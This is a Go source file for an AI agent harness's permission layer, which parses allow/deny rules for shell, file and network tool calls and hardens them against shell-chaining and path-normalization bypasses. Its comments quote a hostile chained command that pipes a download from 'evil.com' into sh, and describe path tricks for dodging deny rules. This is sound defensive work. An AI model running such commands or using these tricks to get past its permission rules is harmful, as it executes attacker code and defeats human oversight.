package permission

import (
	"context"
	"encoding/json"
	"fmt"
	"path"
	"regexp"
	"runtime"
	"strings"
	"sync"

	"github.com/fiddler110/aegis/internal/tool"
)

// RuleAction is the effect of a permission rule.
type RuleAction int

const (
	RuleAllow RuleAction = iota
	RuleDeny
)

func (a RuleAction) String() string {
	if a == RuleDeny {
		return "deny"
	}
	return "allow"
}

// Rule is a text-based, versionable permission rule of the form
//
//	allow <tool>(<pattern>)
//	deny  <tool>(<pattern>)
//
// <tool> is a tool name (e.g. "shell", "write_file"), a friendly alias
// ("bash", "write", "read", "network"), or "*" for any tool. <pattern> is a
// glob matched against the tool's primary input field (command for exec tools,
// path for file tools, url for network tools). A missing "(<pattern>)" — e.g.
// "allow read" — is equivalent to "*" and matches any input.
type Rule struct {
	Action  RuleAction
	Tool    string // tool name, alias, or "*"
	Pattern string // glob; "*" matches any subject
	raw     string // original text, for audit messages
	re      *regexp.Regexp
	// reExec is an alternate compilation of Pattern used for RuleAllow rules
	// matched against execute-capability tools (P7.3): "*"/"?" cannot span
	// shell chaining/substitution metacharacters, so a scoping rule like
	// "allow bash(npm test*)" cannot be bypassed by appending "&& curl
	// evil.com|sh" to an otherwise-matching command. Deny rules deliberately
	// keep the broad re: over-matching on a deny is safe, under-matching on
	// an allow is not.
	reExec *regexp.Regexp
	// rePath is Pattern compiled after path normalization (P7.8), used instead
	// of re/reExec when matching a Read/Write-capability tool: rule matching
	// otherwise compares the tool call's raw, unnormalized path string, so a
	// "deny write(secrets/*)" rule is trivially evaded via "./secrets/x", a
	// case-insensitive filesystem, or a backslash/forward-slash mismatch on
	// Windows — the actual write still succeeds because only the sandbox's
	// root-confinement check runs the real normalization, not rule matching.
	rePath *regexp.Regexp
}

var ruleSyntax = regexp.MustCompile(`^(allow|deny)\s+([A-Za-z_*][\w*]*)\s*(?:\(\s*(.*?)\s*\))?$`)

// ParseRule parses a single rule line. Surrounding and internal whitespace is
// trimmed; an empty or malformed line returns an error.
func ParseRule(s string) (Rule, error) {
	trimmed := strings.TrimSpace(s)
	m := ruleSyntax.FindStringSubmatch(trimmed)
	if m == nil {
		return Rule{}, fmt.Errorf("invalid permission rule %q: want \"allow|deny tool(pattern)\"", s)
	}
	action := RuleAllow
	if m[1] == "deny" {
		action = RuleDeny
	}
	pattern := strings.TrimSpace(m[3])
	if pattern == "" {
		pattern = "*"
	}
	return Rule{
		Action:  action,
		Tool:    m[2],
		Pattern: pattern,
		raw:     trimmed,
		re:      globToRegexp(pattern),
		reExec:  globToRegexpExec(pattern),
		rePath:  globToRegexp(normalizePathLike(pattern)),
	}, nil
}

// ParseRules parses a list of rule lines, skipping blank lines and # comments.
// It returns an error on the first malformed rule.
func ParseRules(lines []string) ([]Rule, error) {
	var rules []Rule
	for _, line := range lines {
		t := strings.TrimSpace(line)
		if t == "" || strings.HasPrefix(t, "#") {
			continue
		}
		r, err := ParseRule(t)
		if err != nil {
			return nil, err
		}
		rules = append(rules, r)
	}
	return rules, nil
}

// matches reports whether the rule applies to a tool call. The tool name (and
// its capability) is matched against the rule's Tool field, and the rule's
// glob is matched against the subject extracted from the input. An allow rule
// scoping an execute-capability tool uses the metachar-restricted reExec
// instead of re (P7.3), so it cannot be widened by shell chaining.
func (r Rule) matches(t tool.Tool, subject string) bool {
	if !ruleToolMatches(r.Tool, t) {
		return false
	}
	switch t.Capability() {
	case tool.CapRead, tool.CapWrite:
		return r.rePath.MatchString(normalizePathLike(subject))
	case tool.CapExecute:
		if r.Action == RuleAllow {
			return r.reExec.MatchString(subject)
		}
	}
	return r.re.MatchString(subject)
}

// normalizePathLike canonicalizes a file-path subject or pattern before a
// Read/Write-capability rule match (P7.8): separators are unified to "/" and
// lexically cleaned (collapsing "./" and resolving ".." segments) so a
// traversal trick like "./secrets/x" can't dodge a "secrets/*" rule, and the
// result is case-folded on platforms whose default filesystem is
// case-insensitive (Windows; macOS's HFS+/APFS default) so a case variant
// can't do the same. Both the extracted subject and the rule's own pattern go
// through this identically, so the comparison stays symmetric.
func normalizePathLike(s string) string {
	if s == "" {
		return s
	}
	s = strings.ReplaceAll(s, "\\", "/")
	s = path.Clean(s)
	if runtime.GOOS == "windows" || runtime.GOOS == "darwin" {
		s = strings.ToLower(s)
	}
	return s
}

// ruleToolMatches reports whether a rule's tool selector matches a tool. The
// selector is "*" (any), an exact tool name, or a capability alias.
func ruleToolMatches(selector string, t tool.Tool) bool {
	if selector == "*" {
		return true
	}
	if selector == t.Name() {
		return true
	}
	switch strings.ToLower(selector) {
	case "bash", "sh", "shell", "exec", "execute":
		return t.Capability() == tool.CapExecute
	case "write":
		return t.Capability() == tool.CapWrite
	case "read":
		return t.Capability() == tool.CapRead
	case "network", "net", "fetch":
		return t.Capability() == tool.CapNetwork
	}
	return false
}

// subjectFieldNames are the input-field names subjectFor knows how to read. A
// tool whose schema exposes none of these can never contribute a non-empty
// subject, so a rule scoping it with anything other than "*" is a silent
// no-op (P7.7) — see WarnUnmatchableRules.
var subjectFieldNames = []string{"command", "path", "file_path", "url", "query", "pattern"}

// subjectFor extracts the string a rule's glob matches against, choosing the
// field most relevant to the tool's capability and falling back to any common
// field present in the input.
func subjectFor(t tool.Tool, input json.RawMessage) string {
	if len(input) == 0 {
		return ""
	}
	var args struct {
		Command  string `json:"command"`
		Path     string `json:"path"`
		FilePath string `json:"file_path"`
		URL      string `json:"url"`
		Query    string `json:"query"`
		Pattern  string `json:"pattern"`
	}
	if json.Unmarshal(input, &args) != nil {
		return ""
	}
	switch t.Capability() {
	case tool.CapExecute:
		return args.Command
	case tool.CapWrite, tool.CapRead:
		return firstNonEmpty(args.Path, args.FilePath)
	case tool.CapNetwork:
		return firstNonEmpty(args.URL, args.Query)
	}
	return firstNonEmpty(args.Command, args.Path, args.FilePath, args.URL, args.Query, args.Pattern)
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

// globToRegexp converts a permission glob to an anchored regexp. Unlike
// path.Match, "*" spans path separators so "/etc/*" matches "/etc/a/b"; this is
// the intuitive behaviour for blast-radius rules. "?" matches a single
// character. All other characters are matched literally.
func globToRegexp(glob string) *regexp.Regexp {
	var b strings.Builder
	b.WriteString("^")
	for _, r := range glob {
		switch r {
		case '*':
			b.WriteString(".*")
		case '?':
			b.WriteString(".")
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteString("$")
	// glob patterns are simple enough that compilation cannot fail, but guard
	// anyway with a never-matching fallback.
	re, err := regexp.Compile(b.String())
	if err != nil {
		return regexp.MustCompile(`$.^`)
	}
	return re
}

// shellMetaClass is the character class excluded from "*"/"?" expansion by
// globToRegexpExec (P7.3): these are the shell characters that chain,
// pipe, substitute, or redirect, so letting a wildcard span them lets a
// scoped allow rule be widened by appending extra commands.
const shellMetaClass = `;&|` + "`" + `$()<>` + "\n\r"

// globToRegexpExec is globToRegexp's counterpart for allow-rules scoping an
// execute-capability tool. Unlike globToRegexp's "*" → ".*" (which spans
// everything, including shell chaining metacharacters), "*"/"?" here cannot
// match any character in shellMetaClass. This closes the gap where
// "allow bash(npm test*)" — compiled the ordinary way to "^npm test.*$" —
// also matches "npm test && curl evil.com|sh", giving a rule meant to narrow
// auto-approval to one command no real boundary against shell injection.
// Literal (non-wildcard) characters in the pattern, including metacharacters
// the rule author wrote explicitly, still match exactly as before.
func globToRegexpExec(glob string) *regexp.Regexp {
	var b strings.Builder
	b.WriteString("^")
	for _, r := range glob {
		switch r {
		case '*':
			b.WriteString("[^" + shellMetaClass + "]*")
		case '?':
			b.WriteString("[^" + shellMetaClass + "]")
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteString("$")
	re, err := regexp.Compile(b.String())
	if err != nil {
		return regexp.MustCompile(`$.^`)
	}
	return re
}

// checker is the minimal decision interface RuleGate composes over, satisfied
// by both the concrete Gate (value receiver) and *ContextualGate.
type checker interface {
	Check(ctx context.Context, t tool.Tool, input json.RawMessage) (bool, string)
}

// RuleGate wraps a base gate and applies text-based allow/deny rules before the
// wrapped gate's decision. Precedence: an explicit deny always blocks; otherwise
// an explicit allow grants (bypassing the wrapped gate and any approver);
// otherwise the call defers to the wrapped gate. RuleGate is intended to be the
// outermost gate so rules are evaluated before the mode and contextual gates.
type RuleGate struct {
	base       checker
	rules      []Rule
	mu         sync.Mutex
	onDecision func(ContextualDecision)
}

// RuleOption configures a RuleGate.
type RuleOption func(*RuleGate)

// WithRuleObserver registers a callback invoked for each rule that decides a
// call (for audit/observability), mirroring ContextualGate's OnDecision.
func WithRuleObserver(fn func(ContextualDecision)) RuleOption {
	return func(g *RuleGate) { g.onDecision = fn }
}

// NewRuleGate wraps base with the given rules.
func NewRuleGate(base checker, rules []Rule, opts ...RuleOption) *RuleGate {
	g := &RuleGate{base: base, rules: rules}
	for _, o := range opts {
		o(g)
	}
	return g
}

// Check implements engine.Gate.
func (g *RuleGate) Check(ctx context.Context, t tool.Tool, input json.RawMessage) (bool, string) {
	subject := subjectFor(t, input)

	// Deny rules take precedence and are evaluated first.
	for _, r := range g.rules {
		if r.Action == RuleDeny && r.matches(t, subject) {
			reason := fmt.Sprintf("%s blocked by permission rule: %s", t.Name(), r.raw)
			g.emit(t, r, Deny, reason)
			return false, reason
		}
	}
	// An explicit allow short-circuits the mode gate and approver.
	for _, r := range g.rules {
		if r.Action == RuleAllow && r.matches(t, subject) {
			g.emit(t, r, Allow, "allowed by permission rule: "+r.raw)
			return true, ""
		}
	}
	// No rule matched — defer to the base (mode-level) gate.
	return g.base.Check(ctx, t, input)
}

func (g *RuleGate) emit(t tool.Tool, r Rule, d Decision, reason string) {
	if g.onDecision == nil {
		return
	}
	g.mu.Lock()
	fn := g.onDecision
	g.mu.Unlock()
	fn(ContextualDecision{
		Tool:     t.Name(),
		Cap:      string(t.Capability()),
		Rule:     "permission_rule:" + r.raw,
		Decision: d,
		Reason:   reason,
	})
}

// WarnUnmatchableRules flags, via warn, any scoped (non-"*" pattern) rule
// whose Tool selector matches a registered tool whose declared input schema
// exposes none of subjectFieldNames (P7.7). subjectFor can only ever return
// "" for such a tool, so the rule's pattern never matches — a scoped
// "deny write(/etc/*)"-style rule silently never blocks that tool instead of
// failing loudly, which is a false sense of security rather than an active
// exploit. Intended to run once at startup against the full tool registry,
// not per tool call.
func WarnUnmatchableRules(rules []Rule, tools []tool.Tool, warn func(msg string, args ...any)) {
	if warn == nil {
		return
	}
	for _, r := range rules {
		if r.Pattern == "*" {
			continue // matches "" trivially; not a no-op
		}
		for _, t := range tools {
			if !ruleToolMatches(r.Tool, t) {
				continue
			}
			if toolHasSubjectField(t) {
				continue
			}
			warn("permission rule can never match this tool and is a silent no-op: its input schema has none of the recognized subject fields",
				"rule", r.raw, "tool", t.Name(), "capability", string(t.Capability()),
				"recognized_fields", strings.Join(subjectFieldNames, ", "))
		}
	}
}

// toolHasSubjectField reports whether t's declared input schema exposes at
// least one of subjectFieldNames. An unparseable schema returns true so a
// schema we can't introspect never produces a false-positive warning.
func toolHasSubjectField(t tool.Tool) bool {
	var schema struct {
		Properties map[string]json.RawMessage `json:"properties"`
	}
	if json.Unmarshal(t.InputSchema(), &schema) != nil {
		return true
	}
	for _, f := range subjectFieldNames {
		if _, ok := schema.Properties[f]; ok {
			return true
		}
	}
	return false
}
